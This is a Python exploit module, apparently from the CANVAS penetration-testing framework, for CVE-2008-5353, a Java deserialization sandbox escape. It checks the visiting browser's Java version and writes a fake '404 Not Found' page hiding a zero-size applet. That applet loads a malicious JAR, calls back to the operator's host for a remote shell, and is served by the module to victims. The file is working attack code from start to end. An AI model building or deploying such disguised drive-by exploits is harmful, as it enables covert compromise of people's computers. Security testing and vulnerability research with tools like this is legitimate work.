##ImmunityHeader v1 
###############################################################################
## File       :  java_deserialize.py
## Description:  
##            :  
## Created_On :  Mon Nov  2 11:57:35 2009
## Created_By :  Justin Seitz
## Modified_On:  Thu Dec 17 09:27:22 2009
## Modified_By:  Justin Seitz
##
## (c) Copyright 2009, Immunity, Inc. all rights reserved.
###############################################################################
#! /usr/bin/env python

# Proprietary CANVAS source code - use only under the license agreement
# specified in LICENSE.txt in your CANVAS distribution
# Copyright Immunity, Inc, 2002-2009
# http://www.immunityinc.com/CANVAS/ for more information

import sys
if "." not in sys.path:
    sys.path.append(".")
    
import canvasengine
from exploitutils import *
from httpclientside import httpclientside

NAME                            = "java_deserialize"
DESCRIPTION                     = "Misdesign in Java deserializing allows JVM sandbox escape"
DOCUMENTATION                   = {}
DOCUMENTATION['VENDOR']         = "Sun"
DOCUMENTATION["Repeatability"]  = "Infinite (client side - no crash)"
DOCUMENTATION["CVE Name"]       = "CVE-2008-5353"
DOCUMENTATION["CVE Url"]        = "http://cve.mitre.org/cgi-bin/cvename.cgi?name=2008-5353"
DOCUMENTATION["References"]     = "http://sunsolve.sun.com/search/document.do?assetkey=1-66-244991-1"
DOCUMENTATION["Date public"]    = "12/3/2008"
DOCUMENTATION["OSVDB"]          = "50500"

VERSION                         = "1.0"

PROPERTY                        = {}
PROPERTY['TYPE']                = "Exploit"
PROPERTY['SITE']                = "Clientside"
PROPERTY['ARCH']                = [ ["UNIX"], ["Windows"] ]
PROPERTY['VERSION']             = []
PROPERTY['DELIVERY']            = 'HTTP'

TARGETS = { 0 : ['JDK/JRE <= 6 Update 10'] }

class theexploit(httpclientside):
    def __init__(self):
        httpclientside.__init__(self)
        self.version            = 0
        self.name               = NAME
        self.htmlfile           = "index.html"
        # filename is used in the actual http server
        self.filename           = self.htmlfile
        self.jarfile            = "SiteException.jar"
        # in standalone mode we want it to adhere
        # to manually chosen callback settings ...
        self.autoFind           = False
        # this exploit can not time out ...
        # it remains active in the browser ...
        self.refresh_rate       = 0
        return

    def neededListenerTypes(self):
        """
        This exploit does not support HTTP MOSDEF!
        """
        return [canvasengine.UNIVERSAL_MOSDEF]
        
    # Vulnerability detection
    def is_vulnerable( self, info_dict ):
        major, minor, build, patch = self.getJavaVersions(info_dict)
        if not major:
            #No Java
            return 0 

        if major == 1:            
            if minor <= 6:
                if patch <= 10:                    
                    # We know this client is vulnerable
                    # assuming we can do TCP outbound on this network
                    return 80          
        return 0
    

    def displayVersions(self):
        for t in TARGETS.keys():
            print "%d: %s" % (t, TARGETS[t][0])
        return

    def required_arguments(self):
        return ['htmlfile'] 

    def getargs(self):
        self.host       = self.target.interface
        for required in self.required_arguments():
            self.getarg(required)
            
        if self.argsDict.get("Daemonize"):
            self.xml_daemonize()
        return 
    
    def run(self):
        self.getargs()

        html            = self.makefile()
        rar             = self.makedownloadfile()
        
        self.log("[+] Opening HTML %s for output" % self.htmlfile)
        fd = file(self.htmlfile, 'wb+')
        fd.write(html)
        fd.close()
        self.log("[+] wrote to %s" % self.htmlfile)
        
        self.log("[+] Opening JAR %s for output" % self.jarfile)
        fd = file(self.jarfile, 'wb+')
        fd.write(rar)
        fd.close()
        self.log("[+] Wrote to %s" % self.jarfile)

        self.log("[+] Place both files together in malicious webroot")        
        return 1

    ## SPIKE Proxy Callbacks ...

    def makedownloadfile(self):
        return file('Resources/javatest.jar', 'rb').read()
        
    def makefile(self):
        """
        17:01 < dave> ideally we can even implement a "this worked" timeout in the java 
        exploits
        17:01 < dave> currently if Java exists, but the exploit fails, then we have no way 
        of knowing
        17:01 < dave> but fixing that would be easy
        """
        html = """
        <html>
            <head>
                <title>404 Not Found</title>
            </head>
            <body>
                <!-- Site 404 Handler Applet -->
                <applet archive="%s" code="SiteError.class" width="0" height="0">
                    <param name="host" value="%s">
                    <param name="port" value="%d">
                    <param name="type" value="%d">
                    <param name="id" value="%d">
                </applet>
                <h1>Not Found</h1>
                <p>The requested URL /%s was not found on this server.</p>
                <hr>
            </body>
        </html>
        """ % (self.jarfile,
               self.callback.ip,
               self.callback.port,
               self.engine.getMosdefType(canvasengine.JAVASERVER),
               self.engine.getNewMosdefID(self),
               self.htmlfile) 
        return html
        
    def makesploit(self, clientheader, clientbody):    
        # we are platform independent
        from libs.spkproxy import header, body
        h           = header('SERVER')
        b           = body()
        user_agent  = clientheader.getStrValue(['User-Agent'])
        
        self.log("[+] User agent of connecting host: %s" % user_agent)        
        if clientheader.URL.count(self.htmlfile):
            self.log("[+] Sending HTML")
            b.setBody(self.makefile())
            
        elif clientheader.URL.count(self.jarfile):
            self.log("[+] Sending JAR")
            data = self.makedownloadfile()
            self.log("[+] Sending %d bytes" % len(data))
            h.addHeader('Content-type', 'binary/octet-stream')
            h.addHeader('Connection', 'close')
            b.setBody(data)

        elif clientheader.URL.count("done"):
            self.log("Did not load Java applet!")
            return None, None
        else:
            self.log("[+] Redirect to %s" % self.htmlfile)
            h.status = '302'
            h.addHeader('Location', self.htmlfile)
            h.addHeader('Content-Type', 'text/html')

        return h,b

if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
    
